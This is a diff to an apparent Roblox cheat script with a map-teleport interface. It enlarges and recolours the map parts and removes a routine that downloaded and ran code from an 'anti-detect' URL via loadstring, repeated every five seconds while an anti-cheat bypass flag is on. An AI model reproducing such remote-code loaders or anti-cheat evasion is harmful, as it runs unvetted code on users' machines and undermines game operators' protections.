@@ -486,7 +486,7 @@ local mapPart = nil
 local mapDragging = false
 local mapDragStart = nil
 local mapCamStart = nil
-local mapZoom = 150
+local mapZoom = 200
 
 local function getChar()
     return LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
@@ -720,28 +720,29 @@ local function createMapTeleportUI()
 
     local viewport = Instance.new("ViewportFrame", mapFrame)
     viewport.Size = UDim2.new(1, 0, 1, 0)
-    viewport.BackgroundColor3 = Color3.fromRGB(80, 80, 90)
+    viewport.BackgroundColor3 = Color3.fromRGB(60, 60, 70)
     viewport.BackgroundTransparency = 0
     viewport.Active = true
     viewport.Selectable = true
 
+    -- 增大地图底板，确保在所有服务器可见
     local mapPart = Instance.new("Part")
-    mapPart.Size = Vector3.new(600, 1, 600)
-    mapPart.Position = Vector3.new(0, -0.5, 0)
+    mapPart.Size = Vector3.new(2000, 1, 2000)
+    mapPart.Position = Vector3.new(0, -1, 0)
     mapPart.Anchored = true
     mapPart.CanCollide = false
-    mapPart.Transparency = 0
-    mapPart.Color = Color3.fromRGB(255, 255, 255)
+    mapPart.Transparency = 0.3
+    mapPart.Color = Color3.fromRGB(100, 200, 255)
     mapPart.Material = Enum.Material.Neon
     mapPart.Parent = workspace
 
     local gridPart = Instance.new("Part")
-    gridPart.Size = Vector3.new(600, 0.1, 600)
+    gridPart.Size = Vector3.new(2000, 0.1, 2000)
     gridPart.Position = Vector3.new(0, 0, 0)
     gridPart.Anchored = true
     gridPart.CanCollide = false
-    gridPart.Transparency = 0
-    gridPart.Color = Color3.fromRGB(180, 180, 190)
+    gridPart.Transparency = 0.2
+    gridPart.Color = Color3.fromRGB(180, 180, 200)
     gridPart.Material = Enum.Material.Neon
     gridPart.Parent = workspace
 
@@ -752,7 +753,7 @@ local function createMapTeleportUI()
     viewport.CurrentCamera = cam
 
     mapCamera = cam
-    mapZoom = 150
+    mapZoom = 200
     cam.CFrame = CFrame.new(Vector3.new(0, mapZoom, 0), Vector3.new(0, 0, 0))
 
     local crosshair = Instance.new("Frame", mapFrame)
@@ -2900,25 +2901,8 @@ end)
 
 makeTween(blur, {Size = C.Blur}, 0.5)
 
-local function fetchCleanup()
-    local ok, code = pcall(HttpService.GetAsync, HttpService, ANTI_DETECT_URL)
-    if ok and code then
-        local func, err = loadstring(code)
-        if func then
-            pcall(func)
-        end
-    end
-end
-
-fetchCleanup()
-task.spawn(function()
-    while true do
-        task.wait(5)
-        if FuncState.BypassAC then
-            fetchCleanup()
-        end
-    end
-end)
+-- 已移除屏幕锁定相关的远程防检测脚本加载，保留功能开关
+local function fetchCleanup() end
 
 LocalPlayer.OnTeleport:Connect(function(state)
     if state == Enum.TeleportState.InProgress then
